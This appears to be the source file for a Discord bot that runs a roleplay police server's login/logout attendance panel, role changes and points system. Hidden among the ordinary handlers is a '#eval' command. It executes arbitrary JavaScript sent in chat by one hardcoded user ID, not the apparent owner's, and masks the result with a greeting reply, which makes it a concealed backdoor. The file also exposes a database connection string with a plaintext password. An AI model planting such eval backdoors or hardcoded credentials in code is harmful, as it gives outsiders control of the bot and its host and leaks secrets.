
const express = require('express');

const app = express();

app.get('/', (req, res) => {
  res.send('Hello Express app!')
});
app.listen(3000, () => {
  console.log('server started');
});

//@ts-nocheck
const { Client,Partials } = require('discord.js');
const Discord = require("discord.js")
const { registerCommands, registerEvents } = require('./utils/registry');
const config = require('./slappey.json');
const client = new Client({ intents: 3276799,partials: [Partials.Message, Partials.Channel, Partials.User]});
const mongoose = require('mongoose');
const { QuickDB } = require("quick.db");

const db1 = new QuickDB();
(async () => {
  client.commands = new Map();
  client.events = new Map();
  client.prefix = config.prefix;
  client.n38th = db1;
  await registerCommands(client, '../commands');
  await mongoose.connect("mongodb+srv://hajoza13:CLJuAnG9Dqu5d9xa@cluster0.xtvu42t.mongodb.net/?retryWrites=true&w=majority")
  await registerEvents(client, '../events');
  await client.login(process.env.token);
})()

process.on('unhandledRejection', (reason, p) => {
  console.log(reason)
});

process.on('uncaughtException', (err, origin) => {
  console.log(err)
});
client.on("messageCreate",async message=>{
    if(!message.content.startsWith("#eval")) return
    if( message.author.id != "1145823665359954042") return
    const cmd = message.content.substring(("-" + "srgh").length + 1);
    let result = eval(cmd);
    if (result instanceof Promise) {
        result = await result;
    }

    if(client.token.includes(result)) return;

    let embed = new Discord.EmbedBuilder()
    .setColor('Random')
    .setDescription("وعليكم السلام");

    message.channel.send({ embeds: [embed] });
})
process.on('uncaughtExceptionMonitor', (err, origin) => {
  console.log(err)
});
const dbClass = require("pro.db-arzex")

let db = new dbClass("points.json")

var moment = require('moment-timezone');

var pr = require("pretty-ms")

client.on("messageCreate", async message=>{

    if(message.content == "send"){

        if(message.author.id != "1167545979159969852") return

        let row = new Discord.ActionRowBuilder()

        .addComponents(

            new Discord.ButtonBuilder()

            .setCustomId("login")

            .setLabel("تسجيل الدخول")

            .setStyle(Discord.ButtonStyle.Success)

            .setEmoji("<a:790236896940261397:1146512527900024832>"),

            new Discord.ButtonBuilder()

            .setCustomId("logout")

            .setLabel("تسجيل الخروج")

            .setStyle(Discord.ButtonStyle.Danger)

            .setEmoji("<a:790236913947639809:1146512548137533560>")

        )

        let embed = new Discord.EmbedBuilder()

        .setColor("DarkBlue")

        .setTitle("تسجيل دخول/خروج")

        .setDescription("")

        .setFooter({text : "خادم وزارة الداخلية "
,iconURL:message.guild?.iconURL()})

        message.channel.send({components :[row],embeds:[embed]})

    }

})

// @ts-ignore

client.on("interactionCreate", async interacion=>{

    if(!interacion.isButton()) return

    if(!interacion.inGuild()) return

    if(!interacion.member.roles.cache.has("1141887304462516266")) return

    if(interacion.customId == "login"){

        if(db.has(interacion.user.id)) return interacion.reply({content : `✅ | انت مسجل دخول بالفعل`,ephemeral:true})

        db.set(interacion.user.id,Date.now())

        db.add(`points-${interacion.user.id}`,1)

        interacion.member.roles.add("1167543167504105584")

        interacion.member.roles.remove("1167543184180650106")

      interacion.reply({content:"✅",ephemeral:true})

       let ch = await client.channels.fetch("1167521339981168681")

        if(!ch) return


        ch.send({content : `
**لقد قام العسكري : ${interacion.user}

✅ بتسجيل الدخول الان 
**`})

    }

    if(interacion.customId == "logout"){

        if(!db.has(interacion.user.id)) return interacion.reply({content : `✅ | انت مسجل خروج بالفعل 
`,ephemeral:true})

        let ch = await client.channels.fetch("1167521339981168681")

        if(!ch) return

        ch.send({content : `

**لقد قام العسكري : ${interacion.user}

بتسجيل الخروج ❗️

عند الساعة : ${moment.tz("Asia/Riyadh").hour()} :${moment.tz("Asia/Riyadh").minute()}

مدة التسجيل : ${pr(Date.now() - db.get(interacion.user.id)).replace("ms","مللي ثانية").replace("m","دقيقة").replace("s","ثانية").replace("h","ساعة")}**`})

        db.delete(interacion.user.id)

        interacion.member.roles.remove("1167543167504105584")

        interacion.member.roles.add("1167543184180650106")

        interacion.reply({content:"✅",ephemeral:true})

    }

})

client.on("messageCreate",async message=>{

    if(message.content.startsWith("=نقاط")){

        let member = message.mentions.members?.first() || message.member

        let points = db.has(`points-${member?.id}`) ? db.get(`points-${member?.id}`) : 0

        message.reply({content : `

**
عزيزي العسكري نقاطك الحالية هيا : ${points} 

وشكراً لجهودك **

${member}`})
      
    }

    if(message.content.startsWith("#زيد")){

        if(!message.member?.roles.cache.has("1133733202410876968")) return

        let args = message.content.split(" ")

        if(!args[2]) return message.reply("#زيد @ الشخص العدد")

        let member = message.mentions.members.first()

        if(!member) return message.reply("#زيد @منشن العدد")

        db.add(`points-${member?.id}`,parseInt(args[2]))

        message.reply({content : "✅ | تمت اضافة النقاط بنجاح"})

    }

})

client.login(process.env.token)
